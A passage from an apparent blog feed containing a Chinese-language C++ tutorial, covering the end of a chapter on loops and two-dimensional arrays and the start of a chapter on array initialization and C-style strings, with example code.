class="line"></span><br><span class="line">    <span class="comment">// 使用嵌套循环遍历并打印所有温度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123; <span class="comment">// 外层循环遍历城市 (行)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123; <span class="comment">// 内层循环遍历月份 (列)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; temperatures[city][month] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// 使用行和列索引访问元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 City 1 的总温度和平均温度</span></span><br><span class="line">    <span class="keyword">double</span> city1_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> city_index = <span class="number">1</span>; <span class="comment">// 要计算的城市索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> month = <span class="number">0</span>; month &lt; NUM_MONTHS; ++month) &#123;</span><br><span class="line">        city1_total += temperatures[city_index][month];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> city1_average = city1_total / NUM_MONTHS;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAverage temperature for City &quot;</span> &lt;&lt; city_index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; city1_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算所有城市第一个月的平均温度</span></span><br><span class="line">    <span class="keyword">double</span> month0_total = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">int</span> month_index = <span class="number">0</span>; <span class="comment">// 要计算的月份索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> city = <span class="number">0</span>; city &lt; NUM_CITIES; ++city) &#123;</span><br><span class="line">        month0_total += temperatures[city][month_index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> month0_average = month0_total / NUM_CITIES;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average temperature for Month &quot;</span> &lt;&lt; month_index &lt;&lt; <span class="string">&quot; across all cities: &quot;</span> &lt;&lt; month0_average &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>内存布局:</strong><br>在内存中，二维数组通常是按<strong>行主序 (Row-Major Order)</strong> 存储的。这意味着第一行的所有元素连续存储，然后是第二行的所有元素，依此类推。例如，<code>matrix[3][4]</code> 的内存布局看起来像：<br><code>matrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3]</code></p><p>理解这一点对于将二维数组传递给函数（通常需要知道列数）或进行某些指针操作很重要。</p><h2 id="5-7-总结"><a href="#5-7-总结" class="headerlink" title="5.7 总结"></a>5.7 总结</h2><p>本章重点介绍了C++中的<strong>循环结构</strong>和<strong>关系表达式</strong>，它们是控制程序流程和处理重复任务的基础。</p><p>我们学习了三种主要的循环语句：</p><ol><li> <strong><code>for</code> 循环:</strong> 这是一种入口条件循环，其头部包含了初始化、测试条件和更新三个部分，结构清晰，特别适用于计数或已知迭代次数的情况。我们探讨了其组成部分、如何修改步长、使用它访问字符串（C风格和<code>std::string</code>），并详细学习了递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符（包括前缀和后缀形式及其区别、副作用和顺序点问题、在指针上的应用）。此外，还介绍了组合赋值运算符（如 <code>+=</code>, <code>-=</code>）和逗号运算符在 <code>for</code> 循环中的应用。</li><li> <strong><code>while</code> 循环:</strong> 这也是一种入口条件循环，但结构更简单，只包含一个测试条件。它适用于循环次数不确定、依赖于某个条件持续满足的情况。我们比较了 <code>for</code> 和 <code>while</code> 的适用场景，并了解了如何使用循环（虽然不推荐）以及现代 C++ 的 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 库来实现延时。</li><li> <strong><code>do while</code> 循环:</strong> 这是一种出口条件循环，其特点是循环体至少执行一次，然后在每次迭代结束时检查条件。它适用于需要确保操作至少发生一次的场景，如用户输入验证。</li></ol><p>C++11 引入的<strong>基于范围的 <code>for</code> 循环</strong>提供了一种更简洁、更安全的遍历序列（如数组、<code>vector</code>、<code>string</code>、初始化列表）中所有元素的方式。我们学习了其语法、如何使用 <code>auto</code>、引用 (<code>&amp;</code>) 和常量引用 (<code>const &amp;</code>) 来声明循环变量，以及它的优点和局限性（如无法直接获取索引）。</p><p><strong>关系表达式</strong>使用关系运算符（<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>==</code>, <code>!=</code>）来比较值，结果为布尔值 <code>true</code> 或 <code>false</code>，常用于循环和分支语句的条件判断。我们特别强调了将赋值运算符 (<code>=</code>) 误用为比较运算符 (<code>==</code>) 的常见错误及其后果。对于字符串比较，我们了解到 C 风格字符串需要使用 <code>&lt;cstring&gt;</code> 中的 <code>strcmp()</code> 函数来比较内容，而 <code>std::string</code> 类则可以直接使用重载的关系运算符进行内容的字典序比较。</p><p>本章还深入探讨了<strong>循环与文本输入</strong>的结合。我们分析了 <code>cin &gt;&gt;</code> 读取单词（跳过并停止于空白）的行为，以及如何使用 <code>cin.get(char)</code> 和无参数的 <code>cin.get()</code> 来逐个读取字符（包括空白符）。我们学习了如何检测<strong>文件尾 (EOF)</strong> 条件以正确终止输入循环，包括检查 <code>cin</code> 流状态和 <code>cin.get()</code> 的返回值。最后，我们了解了读取 C 风格字符串的 <code>cin.get(buffer, size)</code> 版本及其与 <code>getline</code> 的区别（分隔符处理）。</p><p>最后，我们学习了<strong>嵌套循环</strong>的概念，即一个循环包含在另一个循环内部，以及如何使用嵌套循环来处理<strong>二维数组</strong>（数组的数组）。我们了解了二维数组的初始化方法和如何使用双重索引 <code>[row][col]</code> 配合嵌套循环来访问和处理其所有元素。</p><p>通过本章的学习，我们掌握了 C++ 中控制重复执行和进行比较的核心工具，为编写更复杂、更强大的程序奠定了基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 4 复合类型</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_4/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_4/</url>
      
        <content type="html"><![CDATA[<h2 id="4-1-数组"><a href="#4-1-数组" class="headerlink" title="4.1 数组"></a>4.1 数组</h2><p><strong>数组 (Array)</strong> 是一种<strong>复合类型 (Compound Type)**，它允许你存储多个</strong>相同类型<strong>的值。数组中的每个值称为一个</strong>元素 (Element)<strong>，可以通过</strong>索引 (Index)** 或<strong>下标 (Subscript)</strong> 来访问特定元素。</p><h3 id="4-1-1-程序说明"><a href="#4-1-1-程序说明" class="headerlink" title="4.1.1 程序说明"></a>4.1.1 程序说明</h3><p>想象一下，你需要存储一年中每个月的销售额。你可以声明12个独立的 <code>double</code> 变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> salesJan, salesFeb, salesMar, <span class="comment">/* ..., */</span> salesDec; </span><br></pre></td></tr></table></figure><p>这种方法非常繁琐，尤其是在需要处理大量数据时。数组提供了一种更简洁、更强大的方式来处理这种情况。</p><p><strong>数组声明:</strong></p><p>声明一个数组需要指定：</p><ol><li> <strong>元素类型:</strong> 数组中存储的数据类型。</li><li> <strong>数组名称:</strong> 变量名。</li><li> <strong>数组大小:</strong> 数组可以容纳的元素数量，必须是一个<strong>常量表达式</strong>（在编译时就能确定其值的表达式，例如字面常量、<code>const</code> 常量、枚举量或 <code>sizeof</code> 表达式的结果），并且必须放在方括号 <code>[]</code> 内。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize]; </span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个可以存储 12 个 double 类型值的数组，名为 monthlySales</span></span><br><span class="line"><span class="keyword">double</span> monthlySales[<span class="number">12</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个可以存储 5 个 int 类型值的数组，名为 scores</span></span><br><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 const 常量定义数组大小</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_STUDENTS = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">int</span> studentGrades[NUM_STUDENTS]; </span><br></pre></td></tr></table></figure><p><strong>访问数组元素:</strong></p><p>使用数组名和方括号内的索引来访问数组元素。<strong>C++数组的索引从 0 开始</strong>。对于大小为 <code>N</code> 的数组，有效的索引范围是 <code>0</code> 到 <code>N-1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 访问 monthlySales 数组的第一个元素 (一月)</span></span><br><span class="line">monthlySales[<span class="number">0</span>] = <span class="number">1500.50</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问 monthlySales 数组的第三个元素 (三月)</span></span><br><span class="line">monthlySales[<span class="number">2</span>] = <span class="number">2100.75</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问 scores 数组的最后一个元素</span></span><br><span class="line">scores[<span class="number">4</span>] = <span class="number">95</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 scores 数组的第二个元素</span></span><br><span class="line"><span class="keyword">int</span> secondScore = scores[<span class="number">1</span>]; </span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;March sales: &quot;</span> &lt;&lt; monthlySales[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second score: &quot;</span> &lt;&lt; secondScore &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>重要:</strong> C++ 不会自动检查数组索引是否越界。访问 <code>arrayName[N]</code> 或 <code>arrayName[-1]</code>（对于大小为 <code>N</code> 的数组）是**未定义行为 (Undefined Behavior)**，可能导致程序崩溃或数据损坏。程序员有责任确保使用的索引在有效范围内 (<code>0</code> 到 <code>arraySize - 1</code>)。</p><p><strong>数组大小必须是常量表达式:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// int dynamicArray[n]; // 错误! C++ 标准不允许使用变量作为数组大小 (虽然某些编译器可能作为扩展支持)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> staticArray[SIZE]; <span class="comment">// 正确! SIZE 是 const 常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> anotherArray[<span class="number">10</span>]; <span class="comment">// 正确! 10 是字面常量</span></span><br></pre></td></tr></table></figure><p>如果需要在运行时确定数组大小，应该使用动态内存分配（<code>new</code>）或标准库提供的容器（如 <code>std::vector</code>），我们将在后续章节学习。</p><h3 id="4-1-2-数组的初始化规则"><a href="#4-1-2-数组的初始化规则" class="headerlink" title="4.1.2 数组的初始化规则"></a>4.1.2 数组的初始化规则</h3><p>在声明数组时，可以同时对其进行初始化。初始化使用花括号 <code>&#123;&#125;</code> 括起来的**初始化列表 (Initializer List)**。</p><p><strong>规则:</strong></p><ol><li><strong>完整初始化:</strong> 提供与数组大小相同数量的初始值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>] = &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; <span class="comment">// scores[0]=90, scores[1]=85, ..., scores[4]=88</span></span><br><span class="line"><span class="keyword">double</span> lengths[<span class="number">3</span>] = &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>部分初始化:</strong> 如果提供的初始值数量<strong>少于</strong>数组大小，则<strong>剩余的元素会被自动初始化为 0</strong>（对于数值类型）或相应的零等价值（对于其他类型，如字符数组的空字符 <code>\0</code>）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> counts[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// counts[0]=1, counts[1]=2, counts[2]=3</span></span><br><span class="line">                           <span class="comment">// counts[3] 到 counts[9] 都被初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> readings[<span class="number">5</span>] = &#123;<span class="number">9.8f</span>&#125;; <span class="comment">// readings[0]=9.8f, 其他元素为 0.0f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组所有元素初始化为 0 的常用方法</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br></pre></td></tr></table></figure></li><li><strong>省略数组大小:</strong> 如果在声明时提供了初始化列表，可以省略方括号中的数组大小。编译器会根据初始化列表中的元素数量自动推断数组大小。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">short</span> values[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// 编译器推断数组大小为 4</span></span><br><span class="line"><span class="keyword">char</span> message[] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; <span class="comment">// 大小为 6 (包括空字符)</span></span><br></pre></td></tr></table></figure></li><li><strong>不允许初始化列表元素过多:</strong> 初始化列表中的元素数量<strong>不能超过</strong>数组声明的大小。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int errors[3] = &#123;1, 2, 3, 4&#125;; // 错误! 初始化列表元素过多</span></span><br></pre></td></tr></table></figure></li><li><strong>未初始化数组:</strong> 如果在声明数组时没有提供初始化列表（仅适用于非静态局部数组），则数组元素的值是<strong>未定义的 (indeterminate)**，它们会包含内存中遗留的垃圾值。</strong>使用未初始化的变量是常见的错误来源。** <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> garbage[<span class="number">5</span>]; <span class="comment">// 数组元素的值是未定义的 (垃圾值)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; garbage[0]; // 错误! 使用未初始化的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> staticGarbage[<span class="number">5</span>]; <span class="comment">// 静态存储数组会被默认初始化为 0</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; staticGarbage[0]; // 输出 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <em>(静态存储持续性的变量，如全局变量、命名空间变量、静态局部变量，会被默认零初始化)</em></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 完整初始化</span></span><br><span class="line">    <span class="keyword">int</span> fibonacci[<span class="number">8</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci[5]: &quot;</span> &lt;&lt; fibonacci[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部分初始化</span></span><br><span class="line">    <span class="keyword">double</span> data[<span class="number">5</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[0]: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2.2</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[2]: &quot;</span> &lt;&lt; data[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[3]: &quot;</span> &lt;&lt; data[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[4]: &quot;</span> &lt;&lt; data[<span class="number">4</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略大小</span></span><br><span class="line">    <span class="keyword">char</span> vowels[] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of vowels: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(vowels) / <span class="keyword">sizeof</span>(<span class="keyword">char</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化所有元素为 0</span></span><br><span class="line">    <span class="keyword">int</span> results[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Results[15]: &quot;</span> &lt;&lt; results[<span class="number">15</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-3-C-11数组初始化方法"><a href="#4-1-3-C-11数组初始化方法" class="headerlink" title="4.1.3 C++11数组初始化方法"></a>4.1.3 C++11数组初始化方法</h3><p>C++11 引入了更统一的初始化语法，称为<strong>列表初始化 (List Initialization)</strong> 或**花括号初始化 (Brace Initialization)**，它也可以用于数组。</p><p><strong>主要变化:</strong></p><ol><li> <strong>可以省略等号 <code>=</code>:</strong> 在使用初始化列表时，可以省略声明语句中的等号。</li><li> <strong>禁止缩窄转换 (Narrowing Conversion):</strong> 列表初始化不允许可能导致数据丢失的“缩窄”转换。例如，不能将浮点数直接初始化给整型数组元素，也不能将超出范围的整数值初始化给较小范围的整型数组元素。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize] &#123;<span class="built_in">initializer_list</span>&#125;; <span class="comment">// C++11 列表初始化 (可省略等号)</span></span><br><span class="line">typeName arrayName[] &#123;<span class="built_in">initializer_list</span>&#125;;         <span class="comment">// 省略大小</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 列表初始化 (省略等号)</span></span><br><span class="line">    <span class="keyword">int</span> scores[<span class="number">5</span>] &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; </span><br><span class="line">    <span class="keyword">double</span> lengths[<span class="number">3</span>] &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> counts[<span class="number">10</span>] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// 部分初始化，剩余元素为 0</span></span><br><span class="line">    <span class="keyword">int</span> allZeros[<span class="number">100</span>] &#123;&#125;;     <span class="comment">// 所有元素初始化为 0 (空列表)</span></span><br><span class="line">    <span class="keyword">short</span> values[] &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// 省略大小</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores[1]: &quot;</span> &lt;&lt; scores[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 85</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counts[5]: &quot;</span> &lt;&lt; counts[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;allZeros[50]: &quot;</span> &lt;&lt; allZeros[<span class="number">50</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of values: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(values) / <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁止缩窄转换示例</span></span><br><span class="line">    <span class="comment">// int errors[3] &#123;1, 2, 3.0&#125;; // 错误! double (3.0) 到 int 是缩窄转换</span></span><br><span class="line">    <span class="comment">// char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // 错误! 300 超出 char 的范围 (假设 char 是 8 位)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 允许非缩窄转换</span></span><br><span class="line">    <span class="keyword">char</span> chars_ok[<span class="number">3</span>] &#123; <span class="string">&#x27;a&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;c&#x27;</span> &#125;; <span class="comment">// 66 在 char 范围内，可以隐式转换为 &#x27;B&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Chars OK: &quot;</span> &lt;&lt; chars_ok[<span class="number">0</span>] &lt;&lt; chars_ok[<span class="number">1</span>] &lt;&lt; chars_ok[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 aBc</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong> C++11 的列表初始化提供了更一致、更安全的初始化方式，推荐在支持 C++11 及更高标准的项目中使用。特别是 <code>typeName arrayName[size] &#123;&#125;;</code> 这种将所有元素初始化为零值的形式非常方便。</p><h2 id="4-2-字符串"><a href="#4-2-字符串" class="headerlink" title="4.2 字符串"></a>4.2 字符串</h2><p>字符串是程序中用于表示文本信息的重要数据类型。C++处理字符串有两种主要方式：</p><ol><li> <strong>C风格字符串 (C-Style String):</strong> 这是继承自C语言的方式，将字符串视为存储在 <code>char</code> 数组中并以<strong>空字符 (<code>\0</code>)</strong> 结尾的字符序列。</li><li> <strong><code>string</code> 类:</strong> C++标准库提供了一个强大的 <code>string</code> 类，提供了更方便、更安全的字符串操作（将在 4.3 节介绍）。</li></ol><p>本节主要关注 C 风格字符串。</p><p><strong>字符串字面值 (String Literal) 或字符串常量 (String Constant):</strong><br>在代码中用双引号 <code>&quot;&quot;</code> 括起来的字符序列，例如 <code>&quot;Hello, world!&quot;</code>, <code>&quot;C++&quot;</code>, <code>&quot;&quot;</code> (空字符串)。它们存储在内存的只读区域。编译器会自动在字符串字面值的末尾添加空字符 <code>\0</code>。</p><h3 id="4-2-1-拼接字符串常量"><a href="#4-2-1-拼接字符串常量" class="headerlink" title="4.2.1 拼接字符串常量"></a>4.2.1 拼接字符串常量</h3><p>C++允许将<strong>相邻</strong>的字符串字面值自动拼接（连接）成一个单独的字符串。这对于将较长的字符串分成多行书写非常有用，可以提高代码的可读性。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 